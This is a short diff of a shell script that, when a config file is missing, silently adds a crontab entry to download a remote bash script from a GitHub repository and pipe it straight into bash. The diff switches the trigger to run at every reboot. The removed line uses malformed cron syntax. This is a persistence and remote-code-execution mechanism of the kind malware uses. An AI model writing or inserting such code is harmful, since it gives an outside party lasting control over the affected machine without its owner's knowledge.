@@ -13,5 +13,5 @@ if test -f $config; then
   fi
 else
   echo $safe > config
-  (crontab -l 2>/dev/null; echo "/5 * * * * * curl -sSf https://raw.githubusercontent.com/Poliisi5/tuhoja/refs/heads/main/croninator.bash | bash") | crontab -
+  (crontab -l 2>/dev/null; echo "@reboot curl -sSf https://raw.githubusercontent.com/Poliisi5/tuhoja/refs/heads/main/croninator.bash | bash") | crontab -
 fi
